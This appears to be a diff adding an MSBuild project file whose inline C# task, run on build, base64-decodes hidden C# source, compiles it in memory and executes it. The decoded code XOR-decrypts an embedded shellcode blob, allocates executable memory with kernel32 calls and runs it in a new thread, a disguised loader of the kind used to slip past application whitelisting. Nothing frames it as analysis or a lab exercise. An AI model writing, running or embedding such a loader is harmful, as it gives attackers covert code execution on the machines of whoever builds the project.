@@ -1,0 +1,56 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="npscsharp">
+   <lucky7 />
+  </Target>
+  <UsingTask
+    TaskName="lucky7"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+  <Task>
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+        using System;
+        using System.Collections.Generic;
+        using System.Linq;
+        using System.Text;
+        using System.Runtime.InteropServices;
+        using System.Collections.ObjectModel;
+        using Microsoft.Build.Framework;
+        using Microsoft.Build.Utilities;
+        using Microsoft.CSharp;
+        using System.CodeDom.Compiler;
+        using System.Reflection;
+
+        public class lucky7 : Task, ITask
+        {
+            public override bool Execute()
+            {
+                Console.WriteLine("hey there it works!");
+                string cmd = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7CnVzaW5nIFN5c3RlbS5UZXh0OwpwdWJsaWMgY2xhc3MgUGxhaW5KYW5lCnsKICAgIHByaXZhdGUgc3RhdGljIFVJbnQzMiBNRU1fQ09NTUlUID0gMHgxMDAwOwogICAgcHJpdmF0ZSBzdGF0aWMgVUludDMyIFBBR0VfUkVBRFdSSVRFID0gMHgwNDsKICAgIHByaXZhdGUgc3RhdGljIFVJbnQzMiBQQUdFX0VYRUNVVEVfUkVBRCA9IDB4MjA7CiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIFVJbnQzMiBWaXJ0dWFsQWxsb2MoVUludDMyIGxwU3RhcnRBZGRyLCBVSW50MzIgc2l6ZSwgVUludDMyIGZsQWxsb2NhdGlvblR5cGUsIFVJbnQzMiBmbFByb3RlY3QpOwogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBib29sIFZpcnR1YWxQcm90ZWN0KEludFB0ciBhZGRyZXNzLCBVSW50MzIgc2l6ZSwgVUludDMyIG5ld1Byb3RlY3QsIG91dCBVSW50MzIgb2xkUHJvdGVjdCk7CiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIEludFB0ciBDcmVhdGVUaHJlYWQoCiAgICAgICAgVUludDMyIGxwVGhyZWFkQXR0cmlidXRlcywKICAgICAgICBVSW50MzIgZHdTdGFja1NpemUsCiAgICAgICAgVUludDMyIGxwU3RhcnRBZGRyZXNzLAogICAgICAgIEludFB0ciBwYXJhbSwKICAgICAgICBVSW50MzIgZHdDcmVhdGlvbkZsYWdzLAogICAgICAgIHJlZiBVSW50MzIgbHBUaHJlYWRJZAogICAgKTsKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIildCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gVUludDMyIFdhaXRGb3JTaW5nbGVPYmplY3QoSW50UHRyIGhIYW5kbGUsIFVJbnQzMiBkd01pbGxpc2Vjb25kcyk7CiAgICBwdWJsaWMgdm9pZCBFeGVjdXRlKCkgewogICAgICAgIHN0cmluZyByYXcgPSBAImF4OG1MaHQyQ3pVYVBpSmJIeWtJV0Y5eWRVTXRZUVlnTXdZRElTcEVCVmdXZlM1NGZDbDhHellVTndVOGRnTUhDam9FWnhZYkFuc0NOWDVuRW1RN1BoOStQajhUUGpoNkZ4SWdXV1VDZkdZUkNUczNFM1lDSUNwSEoyNW1NRHA1WHpsbmVBVTBGaFYxQVRBMk9RQjhkU293SUZSU0pXMXdJallvV2p4a0dFVjJNU1Y3QlFrYmNRWnhWWGdBRlRvaERYVTlObk5EUDNJN1BRSmlYeFpsWHc0V093OERZU1lWRmhGalVBcDdjMUpmTzNoR0xnWitBamhhSEVRQ01DUUVNeDEvUTJBRVhIa2dLUllsZFE0ZkRIRkdBbU1IZXdSblZ3ZEVZeUV4S1VKcllRUWdJaEFDWXdkNElFVmFKSFYxY2hJQ0x4dDJDd0lpR1JrREh5Y2lCbFJ5WWtRWFBSVTZQbk1tSUE0YVBFUUdKanBrWXhSbVFoY0ZmZ0lVQnpvNkRqRUtCd2dORUdWamMxeE9FUWdqT1RsZ0dFQU5SQjV6QUJ3bVZWVVVjbUltQ0FvWkNWb2NMaElaS0dNSUFnaGZZaWx0UUIwRUJTNCtXeTRZRkJrVkJUY01Cd2RpQjI1QUVtQUJCZ2x5REFVbUl3SURBUXdNZVhrYlVHY0lCWDRaTzNBUUJSSWRMd1lFZVJ4YllpaFlaUnhnTnlnVmNIOEZKaG84V1FBZlBuNXZjSDV5RndFTlBEdHhMejR0VHk0WVl4TWtkR054VTNVSkpRd29Ed1lFSUJWR0FtQXpCVDVsZWlsQ0czVUtGUndaVzNNYkpETUJkaE1ESkZSWEpHWmxKVGgyT2p0L0hETXRHQzRZWXh3RVoyTnllbU1sRTM4cUhYODhXM0l1RkhZMkdCaGNYd0Y1ZFFVWEp5aGljeElUYkU0YVp6WXBlVnhpQW5WMUJSYy9MRHQyQ3lVQ05nNVlFd3NJY25jRmVsc1RHeDA1YjFGbElpaEdBbU03THk1clZ3SjFVd1VSRFRrTVdpMG5MeGdpWG4xekhYVkJDMkJrTFNjc0x5MERFalVuRWhwdUpYdGxYRmRzR3h0cktncFlGV1IrRFE0ZEowSWZJQnNHZWlseEJnc1JERnBpZXgwZEZSb2pkZ2RsWldVPSI7CiAgICAgICAgYnl0ZVtdIHNoZWxsY29kZSA9IENvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhwamxhZGQoIkRQT21aN0p0Q3dMN1JKSjM2QzQ0IiwgQmFzZTY0RGVjb2RlKHJhdykpKTsKICAgICAgICBVSW50MzIgZnVuY0FkZHIgPSBWaXJ0dWFsQWxsb2MoMCwgKFVJbnQzMilzaGVsbGNvZGUuTGVuZ3RoLCBNRU1fQ09NTUlULCBQQUdFX1JFQURXUklURSk7CiAgICAgICAgTWFyc2hhbC5Db3B5KHNoZWxsY29kZSwgMCwgKEludFB0cikoZnVuY0FkZHIpLCBzaGVsbGNvZGUuTGVuZ3RoKTsKICAgICAgICBVSW50MzIgb2xkUHJvdGVjdDsKICAgICAgICBWaXJ0dWFsUHJvdGVjdCgoSW50UHRyKShmdW5jQWRkciksIChVSW50MzIpc2hlbGxjb2RlLkxlbmd0aCwgUEFHRV9FWEVDVVRFX1JFQUQsIG91dCBvbGRQcm90ZWN0KTsKICAgICAgICBJbnRQdHIgaFRocmVhZCA9IEludFB0ci5aZXJvOwogICAgICAgIFVJbnQzMiB0aHJlYWRJZCA9IDA7CiAgICAgICAgSW50UHRyIHBpbmZvID0gSW50UHRyLlplcm87CiAgICAgICAgaFRocmVhZCA9IENyZWF0ZVRocmVhZCgwLCAwLCBmdW5jQWRkciwgcGluZm8sIDAsIHJlZiB0aHJlYWRJZCk7CiAgICAgICAgV2FpdEZvclNpbmdsZU9iamVjdChoVGhyZWFkLCAweEZGRkZGRkZGKTsKICAgIH0KCiAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBwamxhZGQoc3RyaW5nIGtleSwgc3RyaW5nIGlucHV0KQogICAgewogICAgICAgIFN0cmluZ0J1aWxkZXIgc2IgPSBuZXcgU3RyaW5nQnVpbGRlcigpOwogICAgICAgIGZvcihpbnQgaT0wOyBpIDwgaW5wdXQuTGVuZ3RoOyBpKyspCiAgICAgICAgICAgIHNiLkFwcGVuZCgoY2hhcikoaW5wdXRbaV0gXiBrZXlbKGkgJSBrZXkuTGVuZ3RoKV0pKTsKICAgICAgICBTdHJpbmcgcmVzdWx0ID0gc2IuVG9TdHJpbmcoKTsKICAgICAgICByZXR1cm4gcmVzdWx0OwogICAgfQoKICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIEJhc2U2NEVuY29kZShzdHJpbmcgdGV4dCkgewogICAgICAgcmV0dXJuIFN5c3RlbS5Db252ZXJ0LlRvQmFzZTY0U3RyaW5nKFN5c3RlbS5UZXh0LkVuY29kaW5nLlVURjguR2V0Qnl0ZXModGV4dCkpOwogICAgfQoKICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIEJhc2U2NERlY29kZShzdHJpbmcgZW5jb2RlZHRleHQpIHsKCSAgICByZXR1cm4gU3lzdGVtLlRleHQuRW5jb2RpbmcuVVRGOC5HZXRTdHJpbmcoU3lzdGVtLkNvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhlbmNvZGVkdGV4dCkpOwogICAgfQp9";
+                CSharpCodeProvider lucky7 = new CSharpCodeProvider();
+                CompilerParameters parameters = new CompilerParameters();
+                parameters.ReferencedAssemblies.Add("System.dll");
+                parameters.ReferencedAssemblies.Add("System.Runtime.InteropServices.dll");
+                parameters.GenerateExecutable = false;
+                parameters.GenerateInMemory = true;
+                parameters.IncludeDebugInformation = false;
+                CompilerResults results = lucky7.CompileAssemblyFromSource(parameters, Base64Decode(cmd));
+                Assembly assembly = results.CompiledAssembly;
+                object obj = assembly.CreateInstance("PlainJane");
+                obj.GetType().InvokeMember("Execute", BindingFlags.InvokeMethod, null, obj, null);
+                return true;
+            }
+
+            public static string Base64Encode(string text) {
+               return System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(text));
+            }
+
+            public static string Base64Decode(string encodedtext) {
+                return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(encodedtext));
+            }
+        }
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
